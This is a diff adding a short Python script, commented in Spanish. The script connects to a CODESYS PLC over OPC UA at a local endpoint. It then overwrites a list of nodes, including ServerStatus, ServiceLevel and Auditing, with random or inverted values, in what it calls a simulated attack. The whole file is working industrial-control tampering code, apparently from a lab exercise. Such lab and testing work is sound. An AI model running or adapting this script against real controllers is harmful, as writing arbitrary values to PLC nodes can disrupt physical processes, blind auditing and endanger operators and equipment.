@@ -1,0 +1,61 @@
+from opcua import Client
+import logging
+import random
+
+logging.basicConfig(level=logging.INFO)
+
+PLC_ENDPOINT = "opc.tcp://127.0.0.1:4840"
+NODES_TO_ATTACK = [
+    "ns=4;s=|plc|CODESYS Control Win V3 x64",
+    "ns=1;i=2256",  # ServerStatus
+    "ns=1;i=2255",  # NamespaceArray
+    "ns=1;i=2267",  # ServiceLevel
+    "ns=1;i=2994",  # Auditing
+]
+
+try:
+    print("[+] Intentando conectar al PLC...")
+    client = Client(PLC_ENDPOINT)
+    client.connect()
+    print("[+] Conexión exitosa al PLC")
+
+    # Modificar los nodos identificados
+    for node_id in NODES_TO_ATTACK:
+        try:
+            node = client.get_node(node_id)
+            original_value = node.get_value()
+            print(f"[+] Nodo: {node_id}")
+            print(f"    - Valor actual: {original_value}")
+
+            # Generar un nuevo valor aleatorio para simular un ataque
+            if isinstance(original_value, int):
+                new_value = random.randint(1000, 9999)
+            elif isinstance(original_value, float):
+                new_value = round(random.uniform(1000, 9999), 2)
+            elif isinstance(original_value, bool):
+                new_value = not original_value
+            elif isinstance(original_value, str):
+                new_value = original_value[::-1]  # Invierte la cadena
+            else:
+                new_value = "ATAQUE"
+
+            # Cambiar el valor del nodo
+            node.set_value(new_value)
+            print(f"    - Valor cambiado a: {new_value}")
+
+            # Verificar el cambio
+            verified_value = node.get_value()
+            print(f"    - Nuevo valor verificado: {verified_value}")
+
+        except Exception as e:
+            print(f"[-] No se pudo modificar el nodo {node_id}: {e}")
+
+except Exception as e:
+    print("[-] Error al conectar o modificar variable:", e)
+
+finally:
+    try:
+        client.disconnect()
+        print("[+] Conexión cerrada correctamente")
+    except Exception as e:
+        print("[-] Error al cerrar la conexión:", e)
